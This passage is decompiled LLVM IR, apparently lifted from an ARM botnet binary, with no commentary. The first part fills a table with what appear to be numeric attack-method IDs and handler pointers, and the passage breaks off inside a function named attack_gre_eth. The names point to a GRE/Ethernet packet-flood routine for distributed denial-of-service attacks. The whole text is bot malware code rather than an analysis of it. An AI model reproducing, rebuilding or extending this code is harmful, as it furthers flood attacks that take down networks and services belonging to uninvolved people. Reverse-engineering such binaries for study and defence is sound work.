  %v2_86a0 = load i32, i32* @r5, align 4
  %v3_86a0 = add i32 %v2_86a0, 4
  %v4_86a0 = inttoptr i32 %v3_86a0 to i8*
  store i8 %v1_86a0, i8* %v4_86a0, align 1
  %v0_86a4 = load i32, i32* %r1.global-to-local, align 4
  %v3_86a4 = mul i32 %v0_86a4, 4
  store i32 %v3_86a4, i32* %r1.global-to-local, align 4
  %v4_86a8 = inttoptr i32 %v2_8698 to i32*
  %v5_86a8 = call i32 @realloc(i32* %v4_86a8, i32 %v3_86a4, i32 %v6_865c, i32 ptrtoint (i32* @global_var_bd94.39 to i32))
  %v2_86ac = load i8, i8* bitcast (i8** @global_var_22458.29 to i8*), align 4
  %v3_86ac = zext i8 %v2_86ac to i32
  store i32 %v3_86ac, i32* %r3.global-to-local, align 4
  store i32 %v5_86a8, i32* %r2.global-to-local, align 4
  %v0_86b4 = load i32, i32* @r5, align 4
  %v5_86b4 = mul nuw nsw i32 %v3_86ac, 4
  %v6_86b4 = add i32 %v5_86b4, %v5_86a8
  %v7_86b4 = inttoptr i32 %v6_86b4 to i32*
  store i32 %v0_86b4, i32* %v7_86b4, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_86bc = load i32, i32* %r3.global-to-local, align 4
  %v1_86bc = load i32, i32* @r8, align 4
  %v2_86bc = add i32 %v1_86bc, %v0_86bc
  store i32 %v2_86bc, i32* %r3.global-to-local, align 4
  %v1_86c4 = trunc i32 %v2_86bc to i8
  %v2_86c4 = load i32, i32* @r4, align 4
  %v3_86c4 = inttoptr i32 %v2_86c4 to i8*
  store i8 %v1_86c4, i8* %v3_86c4, align 1
  %v0_86c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_86c8 = load i32, i32* @r6, align 4
  %v2_86c8 = inttoptr i32 %v1_86c8 to i32*
  store i32 %v0_86c8, i32* %v2_86c8, align 4
  %v2_86cc = call i32 @calloc(i32 %v1_86bc, i32 8)
  %v2_86d0 = load i8, i8* bitcast (i8** @global_var_22458.29 to i8*), align 4
  %v3_86d0 = zext i8 %v2_86d0 to i32
  store i32 ptrtoint (i32* @global_var_c1cc.41 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_86cc, i32* @r5, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_86e0 = load i32, i32* @r8, align 4
  %v2_86e0 = add i32 %v1_86e0, %v3_86d0
  store i32 %v2_86e0, i32* %r1.global-to-local, align 4
  %v2_86e4 = load i32, i32* @global_var_2245c.31, align 4
  %v2_86e8 = inttoptr i32 %v2_86cc to i32*
  store i32 ptrtoint (i32* @global_var_c1cc.41 to i32), i32* %v2_86e8, align 4
  %v3_86ec = load i32, i32* @r5, align 4
  %v4_86ec = add i32 %v3_86ec, 4
  %v5_86ec = inttoptr i32 %v4_86ec to i8*
  store i8 2, i8* %v5_86ec, align 1
  %v0_86f0 = load i32, i32* %r1.global-to-local, align 4
  %v3_86f0 = mul i32 %v0_86f0, 4
  store i32 %v3_86f0, i32* %r1.global-to-local, align 4
  %v5_86f4 = inttoptr i32 %v2_86e4 to i32*
  %v6_86f4 = call i32 @realloc(i32* %v5_86f4, i32 %v3_86f0, i32 ptrtoint (i32* @global_var_c1cc.41 to i32), i32 2)
  %v2_86f8 = load i8, i8* bitcast (i8** @global_var_22458.29 to i8*), align 4
  %v3_86f8 = zext i8 %v2_86f8 to i32
  store i32 %v3_86f8, i32* %r3.global-to-local, align 4
  store i32 %v6_86f4, i32* %r2.global-to-local, align 4
  %v0_8700 = load i32, i32* @r5, align 4
  %v5_8700 = mul nuw nsw i32 %v3_86f8, 4
  %v6_8700 = add i32 %v5_8700, %v6_86f4
  %v7_8700 = inttoptr i32 %v6_8700 to i32*
  store i32 %v0_8700, i32* %v7_8700, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_8708 = load i32, i32* %r3.global-to-local, align 4
  %v1_8708 = load i32, i32* @r8, align 4
  %v2_8708 = add i32 %v1_8708, %v0_8708
  store i32 %v2_8708, i32* %r3.global-to-local, align 4
  %v1_8710 = load i32, i32* @r6, align 4
  %v2_8710 = inttoptr i32 %v1_8710 to i32*
  store i32 %v6_86f4, i32* %v2_8710, align 4
  %v0_8714 = load i32, i32* %r3.global-to-local, align 4
  %v1_8714 = trunc i32 %v0_8714 to i8
  %v2_8714 = load i32, i32* @r4, align 4
  %v3_8714 = inttoptr i32 %v2_8714 to i8*
  store i8 %v1_8714, i8* %v3_8714, align 1
  %v2_8718 = call i32 @calloc(i32 %v1_8708, i32 8)
  %v2_871c = load i8, i8* bitcast (i8** @global_var_22458.29 to i8*), align 4
  %v3_871c = zext i8 %v2_871c to i32
  store i32 ptrtoint (i32* @global_var_b608.43 to i32), i32* %r3.global-to-local, align 4
  store i32 8, i32* @r7, align 4
  store i32 %v2_8718, i32* @r5, align 4
  %v1_872c = load i32, i32* @r8, align 4
  %v2_872c = add i32 %v1_872c, %v3_871c
  store i32 %v2_872c, i32* %r1.global-to-local, align 4
  %v2_8730 = load i32, i32* @global_var_2245c.31, align 4
  %v2_8734 = inttoptr i32 %v2_8718 to i32*
  store i32 ptrtoint (i32* @global_var_b608.43 to i32), i32* %v2_8734, align 4
  %v0_8738 = load i32, i32* @r7, align 4
  %v1_8738 = trunc i32 %v0_8738 to i8
  %v2_8738 = load i32, i32* @r5, align 4
  %v3_8738 = add i32 %v2_8738, 4
  %v4_8738 = inttoptr i32 %v3_8738 to i8*
  store i8 %v1_8738, i8* %v4_8738, align 1
  %v0_873c = load i32, i32* %r1.global-to-local, align 4
  %v3_873c = mul i32 %v0_873c, 4
  store i32 %v3_873c, i32* %r1.global-to-local, align 4
  %v4_8740 = inttoptr i32 %v2_8730 to i32*
  %v5_8740 = call i32 @realloc(i32* %v4_8740, i32 %v3_873c, i32 %v6_86f4, i32 ptrtoint (i32* @global_var_b608.43 to i32))
  %v2_8744 = load i8, i8* bitcast (i8** @global_var_22458.29 to i8*), align 4
  %v3_8744 = zext i8 %v2_8744 to i32
  store i32 %v3_8744, i32* %r3.global-to-local, align 4
  store i32 %v5_8740, i32* %r2.global-to-local, align 4
  %v0_874c = load i32, i32* @r5, align 4
  %v5_874c = mul nuw nsw i32 %v3_8744, 4
  %v6_874c = add i32 %v5_874c, %v5_8740
  %v7_874c = inttoptr i32 %v6_874c to i32*
  store i32 %v0_874c, i32* %v7_874c, align 4
  %v0_8750 = load i32, i32* @r7, align 4
  store i32 %v0_8750, i32* %r1.global-to-local, align 4
  %v0_8754 = load i32, i32* %r3.global-to-local, align 4
  %v1_8754 = load i32, i32* @r8, align 4
  %v2_8754 = add i32 %v1_8754, %v0_8754
  store i32 %v2_8754, i32* %r3.global-to-local, align 4
  %v1_875c = trunc i32 %v2_8754 to i8
  %v2_875c = load i32, i32* @r4, align 4
  %v3_875c = inttoptr i32 %v2_875c to i8*
  store i8 %v1_875c, i8* %v3_875c, align 1
  %v0_8760 = load i32, i32* %r2.global-to-local, align 4
  %v1_8760 = load i32, i32* @r6, align 4
  %v2_8760 = inttoptr i32 %v1_8760 to i32*
  store i32 %v0_8760, i32* %v2_8760, align 4
  %v2_8764 = call i32 @calloc(i32 %v1_8754, i32 %v0_8750)
  %v2_8768 = load i8, i8* bitcast (i8** @global_var_22458.29 to i8*), align 4
  %v3_8768 = zext i8 %v2_8768 to i32
  store i32 ptrtoint (i32* @global_var_af5c.45 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8764, i32* @r5, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_8778 = load i32, i32* @r8, align 4
  %v2_8778 = add i32 %v1_8778, %v3_8768
  store i32 %v2_8778, i32* %r1.global-to-local, align 4
  %v2_877c = load i32, i32* @global_var_2245c.31, align 4
  %v2_8780 = inttoptr i32 %v2_8764 to i32*
  store i32 ptrtoint (i32* @global_var_af5c.45 to i32), i32* %v2_8780, align 4
  %v3_8784 = load i32, i32* @r5, align 4
  %v4_8784 = add i32 %v3_8784, 4
  %v5_8784 = inttoptr i32 %v4_8784 to i8*
  store i8 3, i8* %v5_8784, align 1
  %v0_8788 = load i32, i32* %r1.global-to-local, align 4
  %v3_8788 = mul i32 %v0_8788, 4
  store i32 %v3_8788, i32* %r1.global-to-local, align 4
  %v5_878c = inttoptr i32 %v2_877c to i32*
  %v6_878c = call i32 @realloc(i32* %v5_878c, i32 %v3_8788, i32 ptrtoint (i32* @global_var_af5c.45 to i32), i32 3)
  %v2_8790 = load i8, i8* bitcast (i8** @global_var_22458.29 to i8*), align 4
  %v3_8790 = zext i8 %v2_8790 to i32
  store i32 %v3_8790, i32* %r3.global-to-local, align 4
  store i32 %v6_878c, i32* %r2.global-to-local, align 4
  %v0_8798 = load i32, i32* @r5, align 4
  %v5_8798 = mul nuw nsw i32 %v3_8790, 4
  %v6_8798 = add i32 %v5_8798, %v6_878c
  %v7_8798 = inttoptr i32 %v6_8798 to i32*
  store i32 %v0_8798, i32* %v7_8798, align 4
  %v0_879c = load i32, i32* @r7, align 4
  store i32 %v0_879c, i32* %r1.global-to-local, align 4
  %v0_87a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_87a0 = load i32, i32* @r8, align 4
  %v2_87a0 = add i32 %v1_87a0, %v0_87a0
  store i32 %v2_87a0, i32* %r3.global-to-local, align 4
  %v1_87a8 = trunc i32 %v2_87a0 to i8
  %v2_87a8 = load i32, i32* @r4, align 4
  %v3_87a8 = inttoptr i32 %v2_87a8 to i8*
  store i8 %v1_87a8, i8* %v3_87a8, align 1
  %v0_87ac = load i32, i32* %r2.global-to-local, align 4
  %v1_87ac = load i32, i32* @r6, align 4
  %v2_87ac = inttoptr i32 %v1_87ac to i32*
  store i32 %v0_87ac, i32* %v2_87ac, align 4
  %v2_87b0 = call i32 @calloc(i32 %v1_87a0, i32 %v0_879c)
  %v2_87b4 = load i8, i8* bitcast (i8** @global_var_22458.29 to i8*), align 4
  %v3_87b4 = zext i8 %v2_87b4 to i32
  store i32 ptrtoint (i32* @global_var_a864.47 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_87b0, i32* @r5, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v1_87c4 = load i32, i32* @r8, align 4
  %v2_87c4 = add i32 %v1_87c4, %v3_87b4
  store i32 %v2_87c4, i32* %r1.global-to-local, align 4
  %v2_87c8 = load i32, i32* @global_var_2245c.31, align 4
  %v2_87cc = inttoptr i32 %v2_87b0 to i32*
  store i32 ptrtoint (i32* @global_var_a864.47 to i32), i32* %v2_87cc, align 4
  %v3_87d0 = load i32, i32* @r5, align 4
  %v4_87d0 = add i32 %v3_87d0, 4
  %v5_87d0 = inttoptr i32 %v4_87d0 to i8*
  store i8 4, i8* %v5_87d0, align 1
  %v0_87d4 = load i32, i32* %r1.global-to-local, align 4
  %v3_87d4 = mul i32 %v0_87d4, 4
  store i32 %v3_87d4, i32* %r1.global-to-local, align 4
  %v5_87d8 = inttoptr i32 %v2_87c8 to i32*
  %v6_87d8 = call i32 @realloc(i32* %v5_87d8, i32 %v3_87d4, i32 ptrtoint (i32* @global_var_a864.47 to i32), i32 4)
  %v2_87dc = load i8, i8* bitcast (i8** @global_var_22458.29 to i8*), align 4
  %v3_87dc = zext i8 %v2_87dc to i32
  store i32 %v3_87dc, i32* %r3.global-to-local, align 4
  store i32 %v6_87d8, i32* %r2.global-to-local, align 4
  %v0_87e4 = load i32, i32* @r5, align 4
  %v5_87e4 = mul nuw nsw i32 %v3_87dc, 4
  %v6_87e4 = add i32 %v5_87e4, %v6_87d8
  %v7_87e4 = inttoptr i32 %v6_87e4 to i32*
  store i32 %v0_87e4, i32* %v7_87e4, align 4
  %v0_87e8 = load i32, i32* @r7, align 4
  store i32 %v0_87e8, i32* %r1.global-to-local, align 4
  %v0_87ec = load i32, i32* %r3.global-to-local, align 4
  %v1_87ec = load i32, i32* @r8, align 4
  %v2_87ec = add i32 %v1_87ec, %v0_87ec
  store i32 %v2_87ec, i32* %r3.global-to-local, align 4
  %v1_87f4 = trunc i32 %v2_87ec to i8
  %v2_87f4 = load i32, i32* @r4, align 4
  %v3_87f4 = inttoptr i32 %v2_87f4 to i8*
  store i8 %v1_87f4, i8* %v3_87f4, align 1
  %v0_87f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_87f8 = load i32, i32* @r6, align 4
  %v2_87f8 = inttoptr i32 %v1_87f8 to i32*
  store i32 %v0_87f8, i32* %v2_87f8, align 4
  %v2_87fc = call i32 @calloc(i32 %v1_87ec, i32 %v0_87e8)
  %v2_8800 = load i8, i8* bitcast (i8** @global_var_22458.29 to i8*), align 4
  %v3_8800 = zext i8 %v2_8800 to i32
  store i32 ptrtoint (i32* @global_var_a0b0.49 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_87fc, i32* @r5, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v1_8810 = load i32, i32* @r8, align 4
  %v2_8810 = add i32 %v1_8810, %v3_8800
  store i32 %v2_8810, i32* %r1.global-to-local, align 4
  %v2_8814 = load i32, i32* @global_var_2245c.31, align 4
  %v2_8818 = inttoptr i32 %v2_87fc to i32*
  store i32 ptrtoint (i32* @global_var_a0b0.49 to i32), i32* %v2_8818, align 4
  %v3_881c = load i32, i32* @r5, align 4
  %v4_881c = add i32 %v3_881c, 4
  %v5_881c = inttoptr i32 %v4_881c to i8*
  store i8 5, i8* %v5_881c, align 1
  %v0_8820 = load i32, i32* %r1.global-to-local, align 4
  %v3_8820 = mul i32 %v0_8820, 4
  store i32 %v3_8820, i32* %r1.global-to-local, align 4
  %v5_8824 = inttoptr i32 %v2_8814 to i32*
  %v6_8824 = call i32 @realloc(i32* %v5_8824, i32 %v3_8820, i32 ptrtoint (i32* @global_var_a0b0.49 to i32), i32 5)
  %v2_8828 = load i8, i8* bitcast (i8** @global_var_22458.29 to i8*), align 4
  %v3_8828 = zext i8 %v2_8828 to i32
  store i32 %v3_8828, i32* %r3.global-to-local, align 4
  store i32 %v6_8824, i32* %r2.global-to-local, align 4
  %v0_8830 = load i32, i32* @r5, align 4
  %v5_8830 = mul nuw nsw i32 %v3_8828, 4
  %v6_8830 = add i32 %v5_8830, %v6_8824
  %v7_8830 = inttoptr i32 %v6_8830 to i32*
  store i32 %v0_8830, i32* %v7_8830, align 4
  %v0_8834 = load i32, i32* @r7, align 4
  store i32 %v0_8834, i32* %r1.global-to-local, align 4
  %v0_8838 = load i32, i32* %r3.global-to-local, align 4
  %v1_8838 = load i32, i32* @r8, align 4
  %v2_8838 = add i32 %v1_8838, %v0_8838
  store i32 %v2_8838, i32* %r3.global-to-local, align 4
  %v1_8840 = trunc i32 %v2_8838 to i8
  %v2_8840 = load i32, i32* @r4, align 4
  %v3_8840 = inttoptr i32 %v2_8840 to i8*
  store i8 %v1_8840, i8* %v3_8840, align 1
  %v0_8844 = load i32, i32* %r2.global-to-local, align 4
  %v1_8844 = load i32, i32* @r6, align 4
  %v2_8844 = inttoptr i32 %v1_8844 to i32*
  store i32 %v0_8844, i32* %v2_8844, align 4
  %v2_8848 = call i32 @calloc(i32 %v1_8838, i32 %v0_8834)
  %v2_884c = load i8, i8* bitcast (i8** @global_var_22458.29 to i8*), align 4
  %v3_884c = zext i8 %v2_884c to i32
  store i32 39164, i32* %r2.global-to-local, align 4
  store i32 %v2_8848, i32* @r5, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_885c = load i32, i32* @r8, align 4
  %v2_885c = add i32 %v1_885c, %v3_884c
  store i32 %v2_885c, i32* %r1.global-to-local, align 4
  %v2_8860 = load i32, i32* @global_var_2245c.31, align 4
  %v2_8864 = inttoptr i32 %v2_8848 to i32*
  store i32 39164, i32* %v2_8864, align 4
  %v3_8868 = load i32, i32* @r5, align 4
  %v4_8868 = add i32 %v3_8868, 4
  %v5_8868 = inttoptr i32 %v4_8868 to i8*
  store i8 10, i8* %v5_8868, align 1
  %v0_886c = load i32, i32* %r1.global-to-local, align 4
  %v3_886c = mul i32 %v0_886c, 4
  store i32 %v3_886c, i32* %r1.global-to-local, align 4
  %v5_8870 = inttoptr i32 %v2_8860 to i32*
  %v6_8870 = call i32 @realloc(i32* %v5_8870, i32 %v3_886c, i32 39164, i32 10)
  %v2_8874 = load i8, i8* bitcast (i8** @global_var_22458.29 to i8*), align 4
  %v3_8874 = zext i8 %v2_8874 to i32
  store i32 %v3_8874, i32* %r3.global-to-local, align 4
  store i32 %v6_8870, i32* %r2.global-to-local, align 4
  %v0_887c = load i32, i32* @r5, align 4
  %v5_887c = mul nuw nsw i32 %v3_8874, 4
  %v6_887c = add i32 %v5_887c, %v6_8870
  %v7_887c = inttoptr i32 %v6_887c to i32*
  store i32 %v0_887c, i32* %v7_887c, align 4
  %v0_8880 = load i32, i32* @r7, align 4
  store i32 %v0_8880, i32* %r1.global-to-local, align 4
  %v0_8884 = load i32, i32* %r3.global-to-local, align 4
  %v1_8884 = load i32, i32* @r8, align 4
  %v2_8884 = add i32 %v1_8884, %v0_8884
  store i32 %v2_8884, i32* %r3.global-to-local, align 4
  %v1_888c = trunc i32 %v2_8884 to i8
  %v2_888c = load i32, i32* @r4, align 4
  %v3_888c = inttoptr i32 %v2_888c to i8*
  store i8 %v1_888c, i8* %v3_888c, align 1
  %v0_8890 = load i32, i32* %r2.global-to-local, align 4
  %v1_8890 = load i32, i32* @r6, align 4
  %v2_8890 = inttoptr i32 %v1_8890 to i32*
  store i32 %v0_8890, i32* %v2_8890, align 4
  %v2_8894 = call i32 @calloc(i32 %v1_8884, i32 %v0_8880)
  %v2_8898 = load i8, i8* bitcast (i8** @global_var_22458.29 to i8*), align 4
  %v3_8898 = zext i8 %v2_8898 to i32
  store i32 ptrtoint (i32* @global_var_9040.52 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8894, i32* @r5, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v1_88a8 = load i32, i32* @r8, align 4
  %v2_88a8 = add i32 %v1_88a8, %v3_8898
  store i32 %v2_88a8, i32* %r1.global-to-local, align 4
  %v2_88ac = load i32, i32* @global_var_2245c.31, align 4
  %v2_88b0 = inttoptr i32 %v2_8894 to i32*
  store i32 ptrtoint (i32* @global_var_9040.52 to i32), i32* %v2_88b0, align 4
  %v3_88b4 = load i32, i32* @r5, align 4
  %v4_88b4 = add i32 %v3_88b4, 4
  %v5_88b4 = inttoptr i32 %v4_88b4 to i8*
  store i8 6, i8* %v5_88b4, align 1
  %v0_88b8 = load i32, i32* %r1.global-to-local, align 4
  %v3_88b8 = mul i32 %v0_88b8, 4
  store i32 %v3_88b8, i32* %r1.global-to-local, align 4
  %v5_88bc = inttoptr i32 %v2_88ac to i32*
  %v6_88bc = call i32 @realloc(i32* %v5_88bc, i32 %v3_88b8, i32 ptrtoint (i32* @global_var_9040.52 to i32), i32 6)
  %v2_88c0 = load i8, i8* bitcast (i8** @global_var_22458.29 to i8*), align 4
  %v3_88c0 = zext i8 %v2_88c0 to i32
  store i32 %v3_88c0, i32* %r3.global-to-local, align 4
  store i32 %v6_88bc, i32* %r2.global-to-local, align 4
  %v0_88c8 = load i32, i32* @r5, align 4
  %v5_88c8 = mul nuw nsw i32 %v3_88c0, 4
  %v6_88c8 = add i32 %v5_88c8, %v6_88bc
  %v7_88c8 = inttoptr i32 %v6_88c8 to i32*
  store i32 %v0_88c8, i32* %v7_88c8, align 4
  %v0_88cc = load i32, i32* @r7, align 4
  store i32 %v0_88cc, i32* %r1.global-to-local, align 4
  %v0_88d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_88d0 = load i32, i32* @r8, align 4
  %v2_88d0 = add i32 %v1_88d0, %v0_88d0
  store i32 %v2_88d0, i32* %r3.global-to-local, align 4
  %v1_88d8 = trunc i32 %v2_88d0 to i8
  %v2_88d8 = load i32, i32* @r4, align 4
  %v3_88d8 = inttoptr i32 %v2_88d8 to i8*
  store i8 %v1_88d8, i8* %v3_88d8, align 1
  %v0_88dc = load i32, i32* %r2.global-to-local, align 4
  %v1_88dc = load i32, i32* @r6, align 4
  %v2_88dc = inttoptr i32 %v1_88dc to i32*
  store i32 %v0_88dc, i32* %v2_88dc, align 4
  %v2_88e0 = call i32 @calloc(i32 %v1_88d0, i32 %v0_88cc)
  %v2_88e4 = load i8, i8* bitcast (i8** @global_var_22458.29 to i8*), align 4
  %v3_88e4 = zext i8 %v2_88e4 to i32
  store i32 ptrtoint (i32* @global_var_89ac.54 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_88e0, i32* @r5, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v1_88f4 = load i32, i32* @r8, align 4
  %v2_88f4 = add i32 %v1_88f4, %v3_88e4
  store i32 %v2_88f4, i32* %r1.global-to-local, align 4
  %v2_88f8 = load i32, i32* @global_var_2245c.31, align 4
  %v2_88fc = inttoptr i32 %v2_88e0 to i32*
  store i32 ptrtoint (i32* @global_var_89ac.54 to i32), i32* %v2_88fc, align 4
  %v3_8900 = load i32, i32* @r5, align 4
  %v4_8900 = add i32 %v3_8900, 4
  %v5_8900 = inttoptr i32 %v4_8900 to i8*
  store i8 7, i8* %v5_8900, align 1
  %v0_8904 = load i32, i32* %r1.global-to-local, align 4
  %v3_8904 = mul i32 %v0_8904, 4
  store i32 %v3_8904, i32* %r1.global-to-local, align 4
  %v5_8908 = inttoptr i32 %v2_88f8 to i32*
  %v6_8908 = call i32 @realloc(i32* %v5_8908, i32 %v3_8904, i32 ptrtoint (i32* @global_var_89ac.54 to i32), i32 7)
  %v2_890c = load i8, i8* bitcast (i8** @global_var_22458.29 to i8*), align 4
  %v3_890c = zext i8 %v2_890c to i32
  store i32 %v3_890c, i32* %r3.global-to-local, align 4
  store i32 %v6_8908, i32* %r2.global-to-local, align 4
  %v0_8914 = load i32, i32* @r5, align 4
  %v5_8914 = mul nuw nsw i32 %v3_890c, 4
  %v6_8914 = add i32 %v5_8914, %v6_8908
  %v7_8914 = inttoptr i32 %v6_8914 to i32*
  store i32 %v0_8914, i32* %v7_8914, align 4
  %v0_8918 = load i32, i32* @r7, align 4
  store i32 %v0_8918, i32* %r1.global-to-local, align 4
  %v0_891c = load i32, i32* %r3.global-to-local, align 4
  %v1_891c = load i32, i32* @r8, align 4
  %v2_891c = add i32 %v1_891c, %v0_891c
  store i32 %v2_891c, i32* %r3.global-to-local, align 4
  %v1_8924 = trunc i32 %v2_891c to i8
  %v2_8924 = load i32, i32* @r4, align 4
  %v3_8924 = inttoptr i32 %v2_8924 to i8*
  store i8 %v1_8924, i8* %v3_8924, align 1
  %v0_8928 = load i32, i32* %r2.global-to-local, align 4
  %v1_8928 = load i32, i32* @r6, align 4
  %v2_8928 = inttoptr i32 %v1_8928 to i32*
  store i32 %v0_8928, i32* %v2_8928, align 4
  %v2_892c = call i32 @calloc(i32 %v1_891c, i32 %v0_8918)
  %v2_8930 = load i8, i8* bitcast (i8** @global_var_22458.29 to i8*), align 4
  %v3_8930 = zext i8 %v2_8930 to i32
  store i32 ptrtoint (i32* @global_var_965c.56 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_892c, i32* @r5, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v1_8940 = load i32, i32* @r8, align 4
  %v2_8940 = add i32 %v1_8940, %v3_8930
  store i32 %v2_8940, i32* %r1.global-to-local, align 4
  %v2_8944 = load i32, i32* @global_var_2245c.31, align 4
  %v2_8948 = inttoptr i32 %v2_892c to i32*
  store i32 ptrtoint (i32* @global_var_965c.56 to i32), i32* %v2_8948, align 4
  %v3_894c = load i32, i32* @r5, align 4
  %v4_894c = add i32 %v3_894c, 4
  %v5_894c = inttoptr i32 %v4_894c to i8*
  store i8 9, i8* %v5_894c, align 1
  %v0_8950 = load i32, i32* %r1.global-to-local, align 4
  %v3_8950 = mul i32 %v0_8950, 4
  store i32 %v3_8950, i32* %r1.global-to-local, align 4
  %v5_8954 = inttoptr i32 %v2_8944 to i32*
  %v6_8954 = call i32 @realloc(i32* %v5_8954, i32 %v3_8950, i32 ptrtoint (i32* @global_var_965c.56 to i32), i32 9)
  %v2_8958 = load i8, i8* bitcast (i8** @global_var_22458.29 to i8*), align 4
  %v3_8958 = zext i8 %v2_8958 to i32
  store i32 %v3_8958, i32* %r3.global-to-local, align 4
  %v1_895c = load i32, i32* @r6, align 4
  %v2_895c = inttoptr i32 %v1_895c to i32*
  store i32 %v6_8954, i32* %v2_895c, align 4
  %v0_8960 = load i32, i32* @r5, align 4
  %v2_8960 = load i32, i32* %r3.global-to-local, align 4
  %v5_8960 = mul i32 %v2_8960, 4
  %v6_8960 = add i32 %v5_8960, %v6_8954
  %v7_8960 = inttoptr i32 %v6_8960 to i32*
  store i32 %v0_8960, i32* %v7_8960, align 4
  %v0_8964 = load i32, i32* %r3.global-to-local, align 4
  %v1_8964 = load i32, i32* @r8, align 4
  %v2_8964 = add i32 %v1_8964, %v0_8964
  store i32 %v2_8964, i32* %r2.global-to-local, align 4
  %v1_896c = trunc i32 %v2_8964 to i8
  %v2_896c = load i32, i32* @r4, align 4
  %v3_896c = inttoptr i32 %v2_896c to i8*
  store i8 %v1_896c, i8* %v3_896c, align 1
  %v2_8970 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_8970, i32* @r4, align 4
  store i32 %v6_8620, i32* @r5, align 4
  store i32 %v9_8620, i32* @r6, align 4
  store i32 %v12_8620, i32* @r7, align 4
  store i32 %v15_8620, i32* @r8, align 4
  ret i32 %v1_8964

; uselistorder directives
  uselistorder i32 %v1_8964, { 1, 0 }
  uselistorder i32 %v3_8950, { 1, 0 }
  uselistorder i32 %v1_891c, { 1, 0 }
  uselistorder i32 %v3_8904, { 1, 0 }
  uselistorder i32 %v1_88d0, { 1, 0 }
  uselistorder i32 %v3_88b8, { 1, 0 }
  uselistorder i32 %v1_8884, { 1, 0 }
  uselistorder i32 %v3_886c, { 1, 0 }
  uselistorder i32 %v1_8838, { 1, 0 }
  uselistorder i32 %v3_8820, { 1, 0 }
  uselistorder i32 %v1_87ec, { 1, 0 }
  uselistorder i32 %v3_87d4, { 1, 0 }
  uselistorder i32 %v1_87a0, { 1, 0 }
  uselistorder i32 %v3_8788, { 1, 0 }
  uselistorder i32 %v1_8754, { 1, 0 }
  uselistorder i32 %v3_873c, { 1, 0 }
  uselistorder i32 %v1_8708, { 1, 0 }
  uselistorder i32 %v6_86f4, { 1, 2, 0, 3 }
  uselistorder i32 %v3_86f0, { 1, 0 }
  uselistorder i32 %v1_86bc, { 1, 0 }
  uselistorder i32 %v3_86a4, { 1, 0 }
  uselistorder i32 %v2_8680, { 1, 0 }
  uselistorder i32 %v6_865c, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8658, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 0 }
  uselistorder i8* bitcast (i8** @global_var_22458.29 to i8*), { 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_22459.37 to i32), { 2, 1, 0 }
  uselistorder i8** @global_var_22458.29, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_22458.29 to i32), { 1, 0 }
}

define i32 @attack_gre_eth(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-54 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_89ac = load i32, i32* @r4, align 4
  %v6_89ac = load i32, i32* @r5, align 4
  %v24_89ac = load i32, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @sl, align 4
  %v2_89c8 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_89cc = load i32, i32* @r5, align 4
  store i32 %v0_89cc, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_89dc = load i32, i32* @r4, align 4
  store i32 %v0_89dc, i32* %r0.global-to-local, align 4
  %v5_89e0 = inttoptr i32 %v0_89cc to i32*
  %v6_89e0 = call i32 @attack_get_opt_int(i32 %v0_89dc, i32* %v5_89e0, i32 2, i32 0, i32 %v2_89c8)
  %v1_89ec = urem i32 %v6_89e0, 256
  store i32 %v1_89ec, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_89f8 = load i32, i32* @r5, align 4
  store i32 %v0_89f8, i32* %r1.global-to-local, align 4
  %v0_89fc = load i32, i32* @r4, align 4
  store i32 %v0_89fc, i32* %r0.global-to-local, align 4
  %v5_8a00 = trunc i32 %v6_89e0 to i8
